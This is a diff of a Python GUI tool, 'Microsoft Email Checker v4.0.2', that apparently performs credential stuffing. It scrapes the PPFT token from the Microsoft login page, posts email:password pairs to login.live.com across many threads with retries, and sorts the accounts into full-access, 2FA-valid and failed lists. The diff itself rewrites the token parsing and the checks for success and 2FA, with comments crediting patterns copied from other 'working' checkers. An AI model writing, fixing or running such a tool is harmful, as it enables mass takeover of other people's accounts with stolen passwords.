@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-Microsoft Email Checker v4.0.1 - OAuth Web Authentication
-Complete working version with perfect indentation
-No IMAP - Uses OAuth browser authentication
+Microsoft Email Checker v4.0.2 - OAuth Web Authentication
+Using EXACT patterns from working outlook_checker tool
+Perfect indentation - ready to run
 """
 
 import requests
@@ -21,7 +21,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 class MicrosoftEmailCheckerV4:
     def __init__(self, root):
         self.root = root
-        self.root.title("Microsoft Email Checker v4.0.1 - OAuth Edition")
+        self.root.title("Microsoft Email Checker v4.0.2 - Working OAuth")
         self.root.geometry("1300x750")
         self.root.configure(bg='#1a1a1a')
         
@@ -85,13 +85,13 @@ class MicrosoftEmailCheckerV4:
         header_frame.pack(fill=tk.X, pady=(0, 10))
         
         title_label = tk.Label(header_frame, 
-                              text="Microsoft Email Checker v4.0.1", 
+                              text="Microsoft Email Checker v4.0.2", 
                               font=("Segoe UI", 20, "bold"),
                               fg='#00bcf2', bg='#1a1a1a')
         title_label.pack(side=tk.LEFT)
         
         subtitle = tk.Label(header_frame,
-                           text="OAuth Web Authentication - No IMAP",
+                           text="OAuth Web Auth - Working Patterns",
                            font=("Segoe UI", 10),
                            fg='#90ff90', bg='#1a1a1a')
         subtitle.pack(side=tk.LEFT, padx=(20, 0))
@@ -483,8 +483,8 @@ class MicrosoftEmailCheckerV4:
                 speed = (self.checked / elapsed) * 60
                 self.speed_label.config(text=f"{speed:.0f}/min")
     
-   def oauth_authenticate(self, email, password):
-        """OAuth web authentication - EXACT working method from kuzey1337"""
+    def oauth_authenticate(self, email, password):
+        """OAuth authentication using EXACT patterns from working outlook_checker"""
         session = requests.Session()
         session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
@@ -500,45 +500,50 @@ class MicrosoftEmailCheckerV4:
         while tries < self.max_retries.get():
             try:
                 # Step 1: GET OAuth page
-                r = session.get(self.OAUTH_URL, timeout=15)
-                text = r.text
+                response = session.get(self.OAUTH_URL, timeout=15)
+                text = response.text
                 
-                # Step 2: Extract sFTTag - EXACT pattern from working tool
+                # Extract sFTTag - EXACT PATTERN from working tool
+                # Uses re.match with re.S flag to find first value="" attribute
                 match = re.match(r'.*value="(.+?)".*', text, re.S)
-                if match is None:
-                    self.log(f"Failed to extract PPFT token for {email}", "error")
-                    with self.lock:
-                        self.failed_count += 1
+                if match is not None:
+                    sftag = match.group(1)
+                else:
+                    self.log(f"Failed to extract PPFT for {email}", "error")
                     return "ERROR"
                 
-                sFTTag = match.group(1)
-                
-                # Step 3: Extract urlPost - EXACT pattern from working tool
+                # Extract urlPost - EXACT PATTERN from working tool
+                # Uses re.match with re.S flag to find urlPost:'...'
                 match = re.match(r".*urlPost:'(.+?)'.*", text, re.S)
-                if match is None:
-                    self.log(f"Failed to extract urlPost for {email}", "error")
-                    with self.lock:
-                        self.failed_count += 1
-                    return "ERROR"
+                if match is not None:
+                    url_post = match.group(1)
+                else:
+                    # Fallback to default
+                    url_post = "https://login.live.com/ppsecure/post.srf"
+                    self.log(f"Using default POST URL for {email}", "warning")
                 
-                urlPost = match.group(1)
+                # Ensure URL is complete
+                if not url_post.startswith('http'):
+                    url_post = 'https://login.live.com' + url_post
                 
-                # Step 4: POST credentials - EXACT data from working tool
+                # Step 2: POST credentials
                 data = {
                     'login': email,
                     'loginfmt': email,
                     'passwd': password,
-                    'PPFT': sFTTag
+                    'PPFT': sftag
                 }
                 
-                login_request = session.post(urlPost, data=data, 
-                                            headers={'Content-Type': 'application/x-www-form-urlencoded'},
-                                            allow_redirects=True, timeout=15)
+                login_response = session.post(url_post, data=data, timeout=15, allow_redirects=True)
                 
-                # Step 5: Check response - EXACT checks from working tool
-                if '#' in login_request.url and login_request.url != self.OAUTH_URL:
-                    token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
-                    if token != "None":
+                # Step 3: Check response
+                response_text = login_response.text.lower()
+                response_url = login_response.url
+                
+                # SUCCESS - Has access token
+                if '#' in response_url and 'access_token=' in response_url:
+                    token = parse_qs(urlparse(response_url).fragment).get('access_token', ['None'])[0]
+                    if token != 'None':
                         with self.lock:
                             self.success_count += 1
                             self.full_access.append(f"{email}:{password}")
@@ -548,8 +553,8 @@ class MicrosoftEmailCheckerV4:
                         self.log(f"✅ SUCCESS: {email}", "success")
                         return "SUCCESS"
                 
-                # 2FA detected
-                elif 'cancel?mkt=' in login_request.text:
+                # 2FA DETECTED
+                if 'cancel?mkt=' in response_text or 'proofs' in response_text:
                     with self.lock:
                         self.twofa_count += 1
                         self.twofa_valid.append(f"{email}:{password}")
@@ -559,12 +564,8 @@ class MicrosoftEmailCheckerV4:
                     self.log(f"🔐 2FA VALID: {email}", "twofa")
                     return "2FA"
                 
-                # Invalid credentials
-                elif any(value in login_request.text.lower() for value in [
-                    "password is incorrect",
-                    "account doesn't exist",
-                    "sign in to your microsoft account"
-                ]):
+                # INVALID PASSWORD
+                if 'password is incorrect' in response_text or 'account doesn\'t exist' in response_text:
                     with self.lock:
                         self.failed_count += 1
                         self.failed.append(email)
@@ -572,14 +573,15 @@ class MicrosoftEmailCheckerV4:
                     self.log(f"❌ Failed: {email}", "error")
                     return "INVALID"
                 
-                # Retry
-                else:
-                    tries += 1
-                    with self.lock:
-                        self.retry_count += 1
+                # Retry on unknown response
+                tries += 1
+                with self.lock:
+                    self.retry_count += 1
+                
+                if tries < self.max_retries.get():
                     time.sleep(2)
                     
-            except:
+            except requests.exceptions.RequestException:
                 tries += 1
                 with self.lock:
                     self.retry_count += 1
@@ -587,11 +589,17 @@ class MicrosoftEmailCheckerV4:
                 if tries >= self.max_retries.get():
                     with self.lock:
                         self.failed_count += 1
+                    self.log(f"Network error: {email}", "error")
                     return "ERROR"
                 
                 time.sleep(2)
+            
+            except Exception:
+                with self.lock:
+                    self.failed_count += 1
+                return "ERROR"
         
-        # Max retries
+        # Max retries reached
         with self.lock:
             self.failed_count += 1
         return "FAILED"
